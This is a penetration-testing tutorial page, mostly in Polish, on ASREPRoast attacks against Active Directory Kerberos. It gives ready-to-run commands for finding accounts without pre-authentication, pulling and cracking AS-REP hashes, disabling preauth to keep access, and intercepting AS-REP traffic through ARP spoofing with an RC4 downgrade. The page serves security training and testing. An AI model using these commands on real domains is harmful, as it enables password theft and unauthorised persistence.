# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast to atak bezpieczeństwa wykorzystujący użytkowników, którym brakuje atrybutu **Kerberos pre-authentication required**. Zasadniczo ta podatność pozwala atakującym zażądać uwierzytelnienia użytkownika z Domain Controller (DC) bez znajomości hasła użytkownika. Następnie DC odpowiada wiadomością zaszyfrowaną kluczem wyprowadzonym z hasła użytkownika, którą atakujący mogą próbować złamać offline w celu odkrycia hasła użytkownika.

Główne wymagania tego ataku to:

- **Brak Kerberos pre-authentication**: docelowi użytkownicy nie mogą mieć włączonej tej funkcji bezpieczeństwa.
- **Połączenie z Domain Controller (DC)**: atakujący potrzebują dostępu do DC, aby wysyłać żądania i odbierać zaszyfrowane wiadomości.
- **Opcjonalne konto domenowe**: posiadanie konta domenowego pozwala atakującym skuteczniej identyfikować podatnych użytkowników za pomocą zapytań LDAP. Bez takiego konta atakujący muszą zgadywać nazwy użytkowników.

#### Enumerating vulnerable users (need domain credentials)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Żądanie wiadomości AS_REP
```bash:Using Linux
# Installed package entrypoint (same logic as GetNPUsers.py)
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
# Use domain creds to LDAP-enumerate roastable users and request them
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
# If you are running directly from the examples/ directory
python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> Rubeus domyślnie żąda **RC4**, dlatego Event ID **4768** zwykle pokazuje **preauth type 0** oraz **ticket encryption type 0x17**. Jeśli dodasz **`/aes`** (lub RC4 jest wyłączone dla celu), oczekuj zamiast tego **AES etypes**.<sup>[[2]](#references)</sup>

#### Szybkie one-linery (Linux)

- Najpierw wylicz potencjalne cele (np. na podstawie leaked build paths) za pomocą Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
- Wykonaj Roast dla całej listy nazw użytkowników bez poprawnych danych uwierzytelniających, używając NetExec: `netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`<sup>[[3]](#references)[[4]](#references)</sup>
- Jeśli masz dane uwierzytelniające, pozwól NetExec odpytać LDAP i zażądać za Ciebie danych każdego konta podatnego na Roast: `netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`<sup>[[3]](#references)</sup>
- Jeśli wynik zaczyna się od **`$krb5asrep$23$`**, złam go za pomocą Hashcat **`-m 18200`**. Jeśli zaczyna się od **`$krb5asrep$17$`** lub **`$krb5asrep$18$`**, preferuj John z opcją **`--format=krb5asrep`**.<sup>[[1]](#references)[[2]](#references)</sup>

### Cracking

Nie zakładaj, że każdy AS-REP roast używa RC4. Nowoczesne narzędzia mogą zwrócić **RC4** (`$krb5asrep$23$`) lub **AES** (`$krb5asrep$17$` / `$krb5asrep$18$`) w zależności od żądanego lub wynegocjowanego enctype. **`hashcat -m 18200`** służy do **etype 23**, natomiast **John** obsługuje `krb5asrep` bezpośrednio dla **17/18/23**.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
```
### Utrzymanie dostępu

Wymuś wyłączenie wymogu **preauth** dla użytkownika, wobec którego masz uprawnienia **GenericAll** (lub uprawnienia do zapisywania właściwości):
```bash:Using Windows
# Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
# Enable ASREPRoastability
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
# Cleanup
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
```
## ASREProast bez poświadczeń

Atakujący może wykorzystać pozycję man-in-the-middle do przechwytywania pakietów AS-REP podczas ich przesyłania przez sieć, bez polegania na wyłączonym uwierzytelnianiu wstępnym Kerberos. Dzięki temu działa to dla wszystkich użytkowników w sieci VLAN.\
Jeśli szukasz powiązanej sztuczki niewymagającej poświadczeń, która zwraca **service ticket** zamiast **TGT** z principalem bez pre-auth, zobacz [Kerberoast](kerberoast.md).

[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) pozwala nam to zrobić. Tryb `relay` jest najciekawszy z ofensywnego punktu widzenia, ponieważ może wymusić **RC4**, gdy klient nadal rozgłasza **etype 23**; `listen` pozostaje pasywny i tylko przechwytuje to, co wynegocjował klient/DC.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Referencje

- [1] [AS-REP Roasting – ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [2] [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
- [3] [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
- [4] [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

---

{{#include ../../banners/hacktricks-training.md}}
